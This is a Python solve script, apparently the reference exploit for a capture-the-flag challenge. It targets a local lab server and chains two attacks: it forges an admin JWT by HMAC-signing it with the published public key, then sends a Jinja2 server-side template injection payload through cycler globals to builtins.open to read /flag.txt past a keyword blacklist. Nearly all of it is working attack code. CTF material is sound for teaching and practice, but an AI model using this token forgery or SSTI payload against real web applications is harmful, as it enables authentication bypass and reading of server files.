#!/usr/bin/env python3
"""
Reference exploit for the Lucky(TM) Channel CTF challenge.

Chains the two intended bugs:
  1. Legacy HS256 token-confusion: forge an admin session token by HMAC-signing
     it with the PUBLISHED public key.
  2. Jinja2 SSTI behind a keyword blacklist: reach builtins.open via a Jinja
     global and read /flag.txt (the blacklist kills os/subprocess/config/etc.,
     but not the builtins route).

Usage:  python3 solve.py [base_url]
        (default base_url = http://localhost:1337)

Only dependency is `requests`.  pip install requests
"""
import sys
import json
import hmac
import base64
import hashlib
import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:1337"


def b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def forge_admin_token(public_key_pem: str) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"user": "h4ck3r", "role": "admin"}
    signing_input = (
        b64url(json.dumps(header, separators=(",", ":")).encode())
        + "."
        + b64url(json.dumps(payload, separators=(",", ":")).encode())
    )
    sig = b64url(
        hmac.new(public_key_pem.encode(), signing_input.encode(), hashlib.sha256).digest()
    )
    return signing_input + "." + sig


def main():
    # --- Stage 1: grab the published public key and forge an admin token ----
    pub = requests.get(BASE + "/lucky-channel/pubkey").text
    print("[*] fetched public key (%d bytes)" % len(pub))
    token = forge_admin_token(pub)
    print("[*] forged admin token:\n    " + token)

    # --- Stage 2: SSTI -> read the flag via builtins.open -------------------
    # dotted form works because Jinja's getattr falls back to getitem, so this
    # resolves whether __builtins__ is a dict or a module.
    payload = '{{ cycler.__init__.__globals__.__builtins__.open("/flag.txt").read() }}'

    r = requests.post(
        BASE + "/backstage",
        cookies={"lucky_token": token},
        data={"announcement": payload},
    )

    if "content filter" in r.text:
        print("[!] payload was blocked by the WAF -- adjust it")
        sys.exit(1)

    # the rendered preview sits inside <div class="preview">...</div>
    marker = '<div class="preview">'
    if marker in r.text:
        out = r.text.split(marker, 1)[1].split("</div>", 1)[0].strip()
        print("[+] FLAG:", out)
    else:
        print("[!] no preview found; are we admin? dumping response:")
        print(r.text[:1500])


if __name__ == "__main__":
    main()
